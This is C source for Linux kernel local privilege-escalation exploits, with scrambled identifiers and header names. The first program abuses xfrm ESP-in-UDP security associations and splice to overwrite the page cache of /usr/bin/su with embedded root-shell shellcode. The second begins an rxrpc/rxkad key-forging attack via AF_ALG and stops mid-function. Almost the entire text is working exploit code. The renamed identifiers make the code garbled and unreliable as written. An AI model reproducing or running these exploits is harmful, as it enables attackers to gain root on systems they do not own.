#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <geCpMdo0nt7h.h>
#include <errno.h>
#include <sched.h>
#include <sys/XEzvusl67_WN.h>
#include <sys/types.h>
#include <sys/fWzEPSYEq_tn.h>
#include <sys/uio.h>
#include <sys/VgwHaV_6ASs2.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>
#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif
#ifndef SOL_UDP
#define SOL_UDP 17
#endif
#define ENC_PORT         4500
#define SEQ_VAL          200
#define REPLAY_SEQ       100
#define TARGET_PATH"/usr/bin/su"#define PATCH_OFFSET     0
#define PAYLOAD_LEN      192
#define ENTRY_OFFSET     0x78
static const KxYLUgm9lW7f shell_elf[PAYLOAD_LEN]={
0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
};
extern int JvZz1i1nqyaC;
int JvZz1i1nqyaC=0;
#define kaNsO_4KqTcp(fmt, ...) do { if (JvZz1i1nqyaC) JXxZGUwWxvAS(stderr,"[su] "fmt"\n",##__VA_ARGS__);}while(0)
static int CGN_9UhioMbO(const char*path,const char*MIJLq5smlqvE)
{
int goBRHYOzax5B=uIs8PCmo8qWx(path,O_WRONLY);
if(goBRHYOzax5B<0)return-1;
int UPLP_8xKA_Tg=niQtHbwyjt0Q(goBRHYOzax5B,MIJLq5smlqvE,qKhHOtL3DMyi(MIJLq5smlqvE));
uTbTPjM3XJjE(goBRHYOzax5B);
return UPLP_8xKA_Tg;
}
static void jLZxYkpm4vtb(void)
{
uid_t real_uid=Xd7pjih6oB0K();
gid_t real_gid=CQ7FPelhFhIQ();
if(noOEFg917RA_(CLONE_NEWUSER|CLONE_NEWNET)<0){
kaNsO_4KqTcp("unshare: %s",fCyi_ikstIvp(errno));
BuhJ9hD59kQT(1);
}
CGN_9UhioMbO("/proc/self/setgroups","deny");
char edRs4tC9nkep[64];
LPQ0STQZ8JYH(edRs4tC9nkep,sizeof(edRs4tC9nkep),"0 %u 1",real_uid);
if(CGN_9UhioMbO("/proc/self/uid_map",edRs4tC9nkep)<0){
kaNsO_4KqTcp("uid_map: %s",fCyi_ikstIvp(errno));BuhJ9hD59kQT(1);
}
LPQ0STQZ8JYH(edRs4tC9nkep,sizeof(edRs4tC9nkep),"0 %u 1",real_gid);
if(CGN_9UhioMbO("/proc/self/gid_map",edRs4tC9nkep)<0){
kaNsO_4KqTcp("gid_map: %s",fCyi_ikstIvp(errno));BuhJ9hD59kQT(1);
}
int EqnzVuA7PHVY=fWzEPSYEq_tn(AF_INET,SOCK_DGRAM,0);
if(EqnzVuA7PHVY<0){kaNsO_4KqTcp("socket: %s",fCyi_ikstIvp(errno));BuhJ9hD59kQT(1);}
struct ifreq ifr;xWkUqujW32sG(&ifr,0,sizeof(ifr));
DIgWqTn7Uj4S(ifr.ifr_name,"lo",IFNAMSIZ);
if(VgwHaV_6ASs2(EqnzVuA7PHVY,SIOCGIFFLAGS,&ifr)<0){kaNsO_4KqTcp("SIOCGIFFLAGS: %s",fCyi_ikstIvp(errno));BuhJ9hD59kQT(1);}
ifr.ifr_flags|=IFF_UP|IFF_RUNNING;
if(VgwHaV_6ASs2(EqnzVuA7PHVY,SIOCSIFFLAGS,&ifr)<0){kaNsO_4KqTcp("SIOCSIFFLAGS: %s",fCyi_ikstIvp(errno));BuhJ9hD59kQT(1);}
uTbTPjM3XJjE(EqnzVuA7PHVY);
}
static void RVCGLGAXDxS8(struct nlmsghdr*nlh,int YkPHtoNqS5ug,const void*jg4Ikogv25ZK,size_t len)
{
struct rtattr*rta=(struct rtattr*)((char*)nlh+LvwpRDbWPrVn(nlh->nlmsg_len));
rta->rta_type=YkPHtoNqS5ug;
rta->rta_len=cQfOZCrhlgyf(len);
uPXCV3bNSGNz(qCXeoyQNYo4k(rta),jg4Ikogv25ZK,len);
nlh->nlmsg_len=LvwpRDbWPrVn(nlh->nlmsg_len)+nDeDzJaaeZzO(rta->rta_len);
}
static int QhCPtQZNi9f0(slFEcJuogSYe spi,slFEcJuogSYe patch_seqhi)
{
int ufYv09SeF04t=fWzEPSYEq_tn(AF_NETLINK,SOCK_RAW,NETLINK_XFRM);
if(ufYv09SeF04t<0)return-1;
struct sockaddr_nl nl={.nl_family=AF_NETLINK};
if(ZtwEjAEf0uQC(ufYv09SeF04t,(struct sockaddr*)&nl,sizeof(nl))<0){uTbTPjM3XJjE(ufYv09SeF04t);return-1;}
char MIJLq5smlqvE[4096]={0};
struct nlmsghdr*nlh=(struct nlmsghdr*)MIJLq5smlqvE;
nlh->nlmsg_type=XFRM_MSG_NEWSA;
nlh->nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK;
nlh->nlmsg_pid=KrYvemeLM24R();
nlh->nlmsg_seq=1;
nlh->nlmsg_len=jOlFSykBmrgu(sizeof(struct xfrm_usersa_info));
struct xfrm_usersa_info*xs=(struct xfrm_usersa_info*)vo6TTXdVyxiu(nlh);
xs->id.daddr.a4=nQbjUkRmYVtN("127.0.0.1");
xs->id.spi=HPFWtllUCBWb(spi);
xs->id.proto=IPPROTO_ESP;
xs->saddr.a4=nQbjUkRmYVtN("127.0.0.1");
xs->family=AF_INET;
xs->mode=XFRM_MODE_TRANSPORT;
xs->replay_window=0;
xs->reqid=0x1234;
xs->flags=XFRM_STATE_ESN;
xs->lft.soft_byte_limit=(XnKUz0JcAZH5)-1;
xs->lft.hard_byte_limit=(XnKUz0JcAZH5)-1;
xs->lft.soft_packet_limit=(XnKUz0JcAZH5)-1;
xs->lft.hard_packet_limit=(XnKUz0JcAZH5)-1;
xs->sel.family=AF_INET;
xs->sel.prefixlen_d=32;
xs->sel.prefixlen_s=32;
xs->sel.daddr.a4=nQbjUkRmYVtN("127.0.0.1");
xs->sel.saddr.a4=nQbjUkRmYVtN("127.0.0.1");
{
char k1jTPG0TrR6O[sizeof(struct xfrm_algo_auth)+32];
xWkUqujW32sG(k1jTPG0TrR6O,0,sizeof(k1jTPG0TrR6O));
struct xfrm_algo_auth*aa=(struct xfrm_algo_auth*)k1jTPG0TrR6O;
DIgWqTn7Uj4S(aa->alg_name,"hmac(sha256)",sizeof(aa->alg_name)-1);
aa->alg_key_len=32*8;
aa->alg_trunc_len=128;
xWkUqujW32sG(aa->alg_key,0xAA,32);
RVCGLGAXDxS8(nlh,XFRMA_ALG_AUTH_TRUNC,k1jTPG0TrR6O,sizeof(k1jTPG0TrR6O));
}
{
char k1jTPG0TrR6O[sizeof(struct xfrm_algo)+16];
xWkUqujW32sG(k1jTPG0TrR6O,0,sizeof(k1jTPG0TrR6O));
struct xfrm_algo*ea=(struct xfrm_algo*)k1jTPG0TrR6O;
DIgWqTn7Uj4S(ea->alg_name,"cbc(aes)",sizeof(ea->alg_name)-1);
ea->alg_key_len=16*8;
xWkUqujW32sG(ea->alg_key,0xBB,16);
RVCGLGAXDxS8(nlh,XFRMA_ALG_CRYPT,k1jTPG0TrR6O,sizeof(k1jTPG0TrR6O));
}
{
struct xfrm_encap_tmpl enc;
xWkUqujW32sG(&enc,0,sizeof(enc));
enc.encap_type=UDP_ENCAP_ESPINUDP;
enc.encap_sport=Q3pvar708XXx(ENC_PORT);
enc.encap_dport=Q3pvar708XXx(ENC_PORT);
enc.encap_oa.a4=0;
RVCGLGAXDxS8(nlh,XFRMA_ENCAP,&enc,sizeof(enc));
}
{
char Ci_lFR5aCNu4[sizeof(struct xfrm_replay_state_esn)+4];
xWkUqujW32sG(Ci_lFR5aCNu4,0,sizeof(Ci_lFR5aCNu4));
struct xfrm_replay_state_esn*esn=(struct xfrm_replay_state_esn*)Ci_lFR5aCNu4;
esn->bmp_len=1;
esn->oseq=0;
esn->seq=REPLAY_SEQ;
esn->oseq_hi=0;
esn->seq_hi=patch_seqhi;
esn->replay_window=32;
RVCGLGAXDxS8(nlh,XFRMA_REPLAY_ESN_VAL,Ci_lFR5aCNu4,sizeof(Ci_lFR5aCNu4));
}
if(tAfjgfl_BRes(ufYv09SeF04t,nlh,nlh->nlmsg_len,0)<0){uTbTPjM3XJjE(ufYv09SeF04t);return-1;}
char VDVYiSC2C3iA[4096];
int UPLP_8xKA_Tg=hK9ywOJU35Ia(ufYv09SeF04t,VDVYiSC2C3iA,sizeof(VDVYiSC2C3iA),0);
if(UPLP_8xKA_Tg<0){uTbTPjM3XJjE(ufYv09SeF04t);return-1;}
struct nlmsghdr*rh=(struct nlmsghdr*)VDVYiSC2C3iA;
if(rh->nlmsg_type==NLMSG_ERROR){
struct nlmsgerr*e=vo6TTXdVyxiu(rh);
if(e->error){uTbTPjM3XJjE(ufYv09SeF04t);return-1;}
}
uTbTPjM3XJjE(ufYv09SeF04t);
return 0;
}
static int TQ7Ea7DPxUmM(const char*path,off_t offset,slFEcJuogSYe spi)
{
int tkMBy_3QK4eb=fWzEPSYEq_tn(AF_INET,SOCK_DGRAM,0);
if(tkMBy_3QK4eb<0)return-1;
int OjEFwVzM0XFO=1;
X8Er_GiQ4bu5(tkMBy_3QK4eb,SOL_SOCKET,SO_REUSEADDR,&OjEFwVzM0XFO,sizeof(OjEFwVzM0XFO));
struct sockaddr_in sa_d={
.sin_family=AF_INET,
.sin_port=Q3pvar708XXx(ENC_PORT),
.sin_addr={nQbjUkRmYVtN("127.0.0.1")},
};
if(ZtwEjAEf0uQC(tkMBy_3QK4eb,(struct sockaddr*)&sa_d,sizeof(sa_d))<0){
uTbTPjM3XJjE(tkMBy_3QK4eb);return-1;
}
int Gh09P5ZtleUL=UDP_ENCAP_ESPINUDP;
if(X8Er_GiQ4bu5(tkMBy_3QK4eb,IPPROTO_UDP,UDP_ENCAP,&Gh09P5ZtleUL,sizeof(Gh09P5ZtleUL))<0){
uTbTPjM3XJjE(tkMBy_3QK4eb);return-1;
}
int FGXbNIHWcusK=fWzEPSYEq_tn(AF_INET,SOCK_DGRAM,0);
if(FGXbNIHWcusK<0){uTbTPjM3XJjE(tkMBy_3QK4eb);return-1;}
if(e8K9JABYdYKx(FGXbNIHWcusK,(struct sockaddr*)&sa_d,sizeof(sa_d))<0){
uTbTPjM3XJjE(FGXbNIHWcusK);uTbTPjM3XJjE(tkMBy_3QK4eb);return-1;
}
int UZ7HZUr1LgLo=uIs8PCmo8qWx(path,O_RDONLY);
if(UZ7HZUr1LgLo<0){uTbTPjM3XJjE(FGXbNIHWcusK);uTbTPjM3XJjE(tkMBy_3QK4eb);return-1;}
int CkYh0HCmV33e[2];
if(b01o8JsSWQsE(CkYh0HCmV33e)<0){uTbTPjM3XJjE(UZ7HZUr1LgLo);uTbTPjM3XJjE(FGXbNIHWcusK);uTbTPjM3XJjE(tkMBy_3QK4eb);return-1;}
KxYLUgm9lW7f hdr[24];
*(slFEcJuogSYe*)(hdr+0)=HPFWtllUCBWb(spi);
*(slFEcJuogSYe*)(hdr+4)=HPFWtllUCBWb(SEQ_VAL);
xWkUqujW32sG(hdr+8,0xCC,16);
struct iovec iov_h={.iov_base=hdr,.iov_len=sizeof(hdr)};
if(MIRGAISBGKjA(CkYh0HCmV33e[1],&iov_h,1,0)!=(FCeyHEe1FNFR)sizeof(hdr)){
uTbTPjM3XJjE(UZ7HZUr1LgLo);uTbTPjM3XJjE(CkYh0HCmV33e[0]);uTbTPjM3XJjE(CkYh0HCmV33e[1]);uTbTPjM3XJjE(FGXbNIHWcusK);uTbTPjM3XJjE(tkMBy_3QK4eb);return-1;
}
off_t off=offset;
FCeyHEe1FNFR EqnzVuA7PHVY=kcUkoOZPLFn_(UZ7HZUr1LgLo,&off,CkYh0HCmV33e[1],NULL,16,SPLICE_F_MOVE);
if(EqnzVuA7PHVY!=16){
uTbTPjM3XJjE(UZ7HZUr1LgLo);uTbTPjM3XJjE(CkYh0HCmV33e[0]);uTbTPjM3XJjE(CkYh0HCmV33e[1]);uTbTPjM3XJjE(FGXbNIHWcusK);uTbTPjM3XJjE(tkMBy_3QK4eb);return-1;
}
EqnzVuA7PHVY=kcUkoOZPLFn_(CkYh0HCmV33e[0],NULL,FGXbNIHWcusK,NULL,24+16,SPLICE_F_MOVE);
Uy1sP7vahHvp(150*1000);
uTbTPjM3XJjE(UZ7HZUr1LgLo);uTbTPjM3XJjE(CkYh0HCmV33e[0]);uTbTPjM3XJjE(CkYh0HCmV33e[1]);
uTbTPjM3XJjE(FGXbNIHWcusK);uTbTPjM3XJjE(tkMBy_3QK4eb);
return EqnzVuA7PHVY==40 ? 0 :-1;
}
static int fVN8GumQlYB4(const char*path,off_t offset,KxYLUgm9lW7f want)
{
int goBRHYOzax5B=uIs8PCmo8qWx(path,O_RDONLY);
if(goBRHYOzax5B<0)return-1;
KxYLUgm9lW7f got;
if(Osc6hXhCf2tf(goBRHYOzax5B,&got,1,offset)!=1){uTbTPjM3XJjE(goBRHYOzax5B);return-1;}
uTbTPjM3XJjE(goBRHYOzax5B);
return got==want ? 0 :-1;
}
static int EWHQYHgeZjZr(void)
{
jLZxYkpm4vtb();
Uy1sP7vahHvp(100*1000);
for(int OSKl1gHVulhW=0;OSKl1gHVulhW<PAYLOAD_LEN/4;OSKl1gHVulhW++){
slFEcJuogSYe spi=0xDEADBE10+OSKl1gHVulhW;
slFEcJuogSYe seqhi=
((slFEcJuogSYe)shell_elf[OSKl1gHVulhW*4+0]<<24)|
((slFEcJuogSYe)shell_elf[OSKl1gHVulhW*4+1]<<16)|
((slFEcJuogSYe)shell_elf[OSKl1gHVulhW*4+2]<<8)|
((slFEcJuogSYe)shell_elf[OSKl1gHVulhW*4+3]);
if(QhCPtQZNi9f0(spi,seqhi)<0){
kaNsO_4KqTcp("add_xfrm_sa #%d failed",OSKl1gHVulhW);
return-1;
}
}
kaNsO_4KqTcp("installed %d xfrm SAs",PAYLOAD_LEN/4);
for(int OSKl1gHVulhW=0;OSKl1gHVulhW<PAYLOAD_LEN/4;OSKl1gHVulhW++){
slFEcJuogSYe spi=0xDEADBE10+OSKl1gHVulhW;
off_t off=PATCH_OFFSET+OSKl1gHVulhW*4;
if(TQ7Ea7DPxUmM(TARGET_PATH,off,spi)<0){
kaNsO_4KqTcp("do_one_write #%d at off=0x%lx failed",OSKl1gHVulhW,(long)off);
return-1;
}
}
kaNsO_4KqTcp("wrote %d bytes to %s starting at 0x%x",
PAYLOAD_LEN,TARGET_PATH,PATCH_OFFSET);
return 0;
}
int vJT7o8MyyBW7(int H2sE8d2gKqV4,char**i8MosvajvkPB)
{
for(int OSKl1gHVulhW=1;OSKl1gHVulhW<H2sE8d2gKqV4;OSKl1gHVulhW++){
if(!z0fxCLkJRZNa(i8MosvajvkPB[OSKl1gHVulhW],"-v")||!z0fxCLkJRZNa(i8MosvajvkPB[OSKl1gHVulhW],"--verbose"))
JvZz1i1nqyaC=1;
else if(!z0fxCLkJRZNa(i8MosvajvkPB[OSKl1gHVulhW],"--corrupt-only"))
;
}
if(nFbyvbuS6mq9("DIRTYFRAG_VERBOSE"))JvZz1i1nqyaC=1;
pid_t cpid=iw2ImeFnDiYc();
if(cpid<0)return 1;
if(cpid==0){
int wbApfH2B4e4V=EWHQYHgeZjZr();
DQkpKHNl35S4(wbApfH2B4e4V==0 ? 0 : 2);
}
int pPb4rzXd7mF6;
X9CUHnJp5rgE(cpid,&pPb4rzXd7mF6,0);
if(!zKT712vlEnxb(pPb4rzXd7mF6)||SleXZQANsYa4(pPb4rzXd7mF6)!=0){
kaNsO_4KqTcp("corruption stage failed (status=0x%x)",pPb4rzXd7mF6);
return 1;
}
if(fVN8GumQlYB4(TARGET_PATH,ENTRY_OFFSET,0x31)!=0||
fVN8GumQlYB4(TARGET_PATH,ENTRY_OFFSET+1,0xff)!=0){
kaNsO_4KqTcp("post-write verify failed (target unchanged)");
return 1;
}
kaNsO_4KqTcp("/usr/bin/su page-cache patched (entry 0x%x = shellcode)",
ENTRY_OFFSET);
return 0;
}
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <geCpMdo0nt7h.h>
#include <ta2KYcSNCM1U.h>
#include <sched.h>
#include <xDCitq1jlHVM.h>
#include <Z5FTevbnL7G4.h>
#include <sys/wait.h>
#include <sys/fWzEPSYEq_tn.h>
#include <sys/XEzvusl67_WN.h>
#include <sys/uio.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/VgwHaV_6ASs2.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/rxrpc.h>
#include <linux/keyctl.h>
#include <linux/if_alg.h>
#include <net/if.h>
#include <termios.h>
#ifndef AF_RXRPC
#define AF_RXRPC 33
#endif
#ifndef PF_RXRPC
#define PF_RXRPC AF_RXRPC
#endif
#ifndef SOL_RXRPC
#define SOL_RXRPC 272
#endif
#ifndef SOL_ALG
#define SOL_ALG 279
#endif
#ifndef AF_ALG
#define AF_ALG 38
#endif
#ifndef MSG_SPLICE_PAGES
#define MSG_SPLICE_PAGES 0x8000000
#endif
#define RXRPC_PACKET_TYPE_DATA          1
#define RXRPC_PACKET_TYPE_ACK           2
#define RXRPC_PACKET_TYPE_ABORT         4
#define RXRPC_PACKET_TYPE_CHALLENGE     6
#define RXRPC_PACKET_TYPE_RESPONSE      7
#define RXRPC_CLIENT_INITIATED          0x01
#define RXRPC_REQUEST_ACK               0x02
#define RXRPC_LAST_PACKET               0x04
#define RXRPC_CHANNELMASK               3
#define RXRPC_CIDSHIFT                  2
struct rxrpc_wire_header{
slFEcJuogSYe epoch;
slFEcJuogSYe cid;
slFEcJuogSYe callNumber;
slFEcJuogSYe seq;
slFEcJuogSYe serial;
KxYLUgm9lW7f YkPHtoNqS5ug;
KxYLUgm9lW7f flags;
KxYLUgm9lW7f userStatus;
KxYLUgm9lW7f securityIndex;
uint16_t cksum;
uint16_t serviceId;
}bjHlGj0LQhu3((packed));
struct rxkad_challenge{
slFEcJuogSYe version;
slFEcJuogSYe nonce;
slFEcJuogSYe zhPz2oyZYvqm;
slFEcJuogSYe __padding;
}bjHlGj0LQhu3((packed));
static KxYLUgm9lW7f SESSION_KEY[8]={
0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08
};
#define co1uhCExyQ8x(fmt, ...) JXxZGUwWxvAS(stderr,"[+] "fmt"\n",##__VA_ARGS__)
#define LoUvlUIx9Y16(fmt, ...) JXxZGUwWxvAS(stderr,"[!] "fmt"\n",##__VA_ARGS__)
#define BLgM68WIg_aG(fmt, ...) JXxZGUwWxvAS(stderr,"[.] "fmt"\n",##__VA_ARGS__)
static int JxsgrG9zYqub(const char*path,const char*fmt,...)
{
int goBRHYOzax5B=uIs8PCmo8qWx(path,O_WRONLY);
if(goBRHYOzax5B<0)return-1;
char MIJLq5smlqvE[256];va_list ap;kJYKvZeDNH85(ap,fmt);
int UPLP_8xKA_Tg=JR9ZLwqubyYq(MIJLq5smlqvE,sizeof(MIJLq5smlqvE),fmt,ap);sls0wpm5q_ia(ap);
int QDcGHa7QwzpE=(int)niQtHbwyjt0Q(goBRHYOzax5B,MIJLq5smlqvE,UPLP_8xKA_Tg);uTbTPjM3XJjE(goBRHYOzax5B);
return QDcGHa7QwzpE;
}
static int k13_jPRsRPg_(void)
{
uid_t real_uid=Xd7pjih6oB0K();
gid_t real_gid=CQ7FPelhFhIQ();
if(noOEFg917RA_(CLONE_NEWUSER|CLONE_NEWNET)<0){
LoUvlUIx9Y16("unshare(NEWUSER|NEWNET): %s",fCyi_ikstIvp(errno));
return-1;
}
co1uhCExyQ8x("unshare(USER|NET) OK, real uid=%u",real_uid);
JxsgrG9zYqub("/proc/self/setgroups","deny");
if(JxsgrG9zYqub("/proc/self/uid_map","%u %u 1",real_uid,real_uid)<0){
LoUvlUIx9Y16("uid_map: %s",fCyi_ikstIvp(errno));return-1;
}
if(JxsgrG9zYqub("/proc/self/gid_map","%u %u 1",real_gid,real_gid)<0){
LoUvlUIx9Y16("gid_map: %s",fCyi_ikstIvp(errno));return-1;
}
co1uhCExyQ8x("uid/gid identity-mapped %u/%u; gained CAP_NET_RAW within netns",
real_uid,real_gid);
int EqnzVuA7PHVY=fWzEPSYEq_tn(AF_INET,SOCK_DGRAM,0);
if(EqnzVuA7PHVY>=0){
struct ifreq ifr;xWkUqujW32sG(&ifr,0,sizeof(ifr));
VgsSvVauA1X6(ifr.ifr_name,"lo");
if(VgwHaV_6ASs2(EqnzVuA7PHVY,SIOCGIFFLAGS,&ifr)==0){
ifr.ifr_flags|=IFF_UP|IFF_RUNNING;
if(VgwHaV_6ASs2(EqnzVuA7PHVY,SIOCSIFFLAGS,&ifr)<0)
LoUvlUIx9Y16("SIOCSIFFLAGS lo: %s",fCyi_ikstIvp(errno));
else
co1uhCExyQ8x("lo brought UP in new netns");
}
uTbTPjM3XJjE(EqnzVuA7PHVY);
}
return 0;
}
static long U_jjaNOyRMgk(const char*YkPHtoNqS5ug,const char*desc,
const void*payload,size_t plen,int Udb0kZEky98N)
{
return XEzvusl67_WN(SYS_add_key,YkPHtoNqS5ug,desc,payload,plen,Udb0kZEky98N);
}
static int bp64hi4_RtyJ(KxYLUgm9lW7f*Nbiy1HmiYjfm,size_t maxlen)
{
KxYLUgm9lW7f*StBpOFaxouUU=Nbiy1HmiYjfm;
slFEcJuogSYe now=(slFEcJuogSYe)ta2KYcSNCM1U(NULL);
slFEcJuogSYe expires=now+86400;
*(slFEcJuogSYe*)StBpOFaxouUU=HPFWtllUCBWb(0);StBpOFaxouUU+=4;
const char*cell="evil";
slFEcJuogSYe clen=qKhHOtL3DMyi(cell);
*(slFEcJuogSYe*)StBpOFaxouUU=HPFWtllUCBWb(clen);StBpOFaxouUU+=4;
uPXCV3bNSGNz(StBpOFaxouUU,cell,clen);
slFEcJuogSYe pad=(4-(clen&3))&3;
xWkUqujW32sG(StBpOFaxouUU+clen,0,pad);
StBpOFaxouUU+=clen+pad;
*(slFEcJuogSYe*)StBpOFaxouUU=HPFWtllUCBWb(1);StBpOFaxouUU+=4;
KxYLUgm9lW7f*toklen_p=StBpOFaxouUU;StBpOFaxouUU+=4;
KxYLUgm9lW7f*tokstart=StBpOFaxouUU;
*(slFEcJuogSYe*)StBpOFaxouUU=HPFWtllUCBWb(2);StBpOFaxouUU+=4;
*(slFEcJuogSYe*)StBpOFaxouUU=HPFWtllUCBWb(0);StBpOFaxouUU+=4;
*(slFEcJuogSYe*)StBpOFaxouUU=HPFWtllUCBWb(1);StBpOFaxouUU+=4;
uPXCV3bNSGNz(StBpOFaxouUU,SESSION_KEY,8);StBpOFaxouUU+=8;
*(slFEcJuogSYe*)StBpOFaxouUU=HPFWtllUCBWb(now);StBpOFaxouUU+=4;
*(slFEcJuogSYe*)StBpOFaxouUU=HPFWtllUCBWb(expires);StBpOFaxouUU+=4;
*(slFEcJuogSYe*)StBpOFaxouUU=HPFWtllUCBWb(1);StBpOFaxouUU+=4;
*(slFEcJuogSYe*)StBpOFaxouUU=HPFWtllUCBWb(8);StBpOFaxouUU+=4;
xWkUqujW32sG(StBpOFaxouUU,0xCC,8);StBpOFaxouUU+=8;
slFEcJuogSYe toklen=(slFEcJuogSYe)(StBpOFaxouUU-tokstart);
*(slFEcJuogSYe*)toklen_p=HPFWtllUCBWb(toklen);
if((size_t)(StBpOFaxouUU-Nbiy1HmiYjfm)>maxlen){errno=E2BIG;return-1;}
return(int)(StBpOFaxouUU-Nbiy1HmiYjfm);
}
static long N_2Rsvts35Is(const char*desc)
{
KxYLUgm9lW7f MIJLq5smlqvE[512];
int UPLP_8xKA_Tg=bp64hi4_RtyJ(MIJLq5smlqvE,sizeof(MIJLq5smlqvE));
if(UPLP_8xKA_Tg<0)return-1;
return U_jjaNOyRMgk("rxrpc",desc,MIJLq5smlqvE,UPLP_8xKA_Tg,KEY_SPEC_PROCESS_KEYRING);
}
static int yL46hTAX_uAN(const KxYLUgm9lW7f H8kEKws9XKJi[8])
{
int EqnzVuA7PHVY=fWzEPSYEq_tn(AF_ALG,SOCK_SEQPACKET,0);
if(EqnzVuA7PHVY<0){LoUvlUIx9Y16("socket(AF_ALG): %s",fCyi_ikstIvp(errno));return-1;}
struct sockaddr_alg sa={.salg_family=AF_ALG};
VgsSvVauA1X6((char*)sa.salg_type,"skcipher");
VgsSvVauA1X6((char*)sa.salg_name,"pcbc(fcrypt)");
if(ZtwEjAEf0uQC(EqnzVuA7PHVY,(struct sockaddr*)&sa,sizeof(sa))<0){
LoUvlUIx9Y16("bind(AF_ALG pcbc(fcrypt)): %s",fCyi_ikstIvp(errno));
uTbTPjM3XJjE(EqnzVuA7PHVY);return-1;
}
if(X8Er_GiQ4bu5(EqnzVuA7PHVY,SOL_ALG,ALG_SET_KEY,H8kEKws9XKJi,8)<0){
LoUvlUIx9Y16("ALG_SET_KEY: %s",fCyi_ikstIvp(errno));
uTbTPjM3XJjE(EqnzVuA7PHVY);return-1;
}
return EqnzVuA7PHVY;
}
static int A8NJGBtihtsK(int gc_3BuITfcDJ,int KhP_lmTI7UxK,const KxYLUgm9lW7f iv[8],
const void*in,size_t inlen,void*Nbiy1HmiYjfm)
{
int TcSigKy3Lhe5=rgbimO26hWTo(gc_3BuITfcDJ,NULL,NULL);
if(TcSigKy3Lhe5<0){LoUvlUIx9Y16("accept(AF_ALG): %s",fCyi_ikstIvp(errno));return-1;}
char qQoFvmXCdP0C[j45VteOB05Op(sizeof(int))+
j45VteOB05Op(sizeof(struct af_alg_iv)+8)]={0};
struct msghdr msg={0};
msg.msg_control=qQoFvmXCdP0C;
msg.msg_controllen=sizeof(qQoFvmXCdP0C);
struct cmsghdr*khMFbCqeHtjS=VJM5oXi9BU5_(&msg);
khMFbCqeHtjS->cmsg_level=SOL_ALG;
khMFbCqeHtjS->cmsg_type=ALG_SET_OP;
khMFbCqeHtjS->cmsg_len=kUKoh__Ect0F(sizeof(int));
*(int*)uRDsryGXuMhx(khMFbCqeHtjS)=KhP_lmTI7UxK;
khMFbCqeHtjS=hEGRMfZRXDbp(&msg,khMFbCqeHtjS);
khMFbCqeHtjS->cmsg_level=SOL_ALG;
khMFbCqeHtjS->cmsg_type=ALG_SET_IV;
khMFbCqeHtjS->cmsg_len=kUKoh__Ect0F(sizeof(struct af_alg_iv)+8);
struct af_alg_iv*aiv=(struct af_alg_iv*)uRDsryGXuMhx(khMFbCqeHtjS);
aiv->ivlen=8;
uPXCV3bNSGNz(aiv->iv,iv,8);
struct iovec iov={.iov_base=(void*)in,.iov_len=inlen};
msg.msg_iov=&iov;msg.msg_iovlen=1;
if(b1vACn4h_j7n(TcSigKy3Lhe5,&msg,0)<0){
LoUvlUIx9Y16("AF_ALG sendmsg: %s",fCyi_ikstIvp(errno));
uTbTPjM3XJjE(TcSigKy3Lhe5);return-1;
}
FCeyHEe1FNFR UPLP_8xKA_Tg=tAnVbQJ1a4_N(TcSigKy3Lhe5,Nbiy1HmiYjfm,inlen);
uTbTPjM3XJjE(TcSigKy3Lhe5);
if(UPLP_8xKA_Tg!=(FCeyHEe1FNFR)inlen){
LoUvlUIx9Y16("AF_ALG read got %zd want %zu: %s",
UPLP_8xKA_Tg,inlen,fCyi_ikstIvp(errno));
return-1;
}
return 0;
}
static int _HkLi36H1ooE(slFEcJuogSYe epoch,slFEcJuogSYe cid,slFEcJuogSYe sec_ix,
const KxYLUgm9lW7f H8kEKws9XKJi[8],KxYLUgm9lW7f csum_iv[8])
{
int EqnzVuA7PHVY=yL46hTAX_uAN(H8kEKws9XKJi);
if(EqnzVuA7PHVY<0)return-1;
slFEcJuogSYe in[4]={HPFWtllUCBWb(epoch),HPFWtllUCBWb(cid),0,HPFWtllUCBWb(sec_ix)};
KxYLUgm9lW7f Nbiy1HmiYjfm[16];
int wbApfH2B4e4V=A8NJGBtihtsK(EqnzVuA7PHVY,ALG_OP_ENCRYPT,H8kEKws9XKJi,in,16,Nbiy1HmiYjfm);
uTbTPjM3XJjE(EqnzVuA7PHVY);
if(wbApfH2B4e4V<0)return-1;
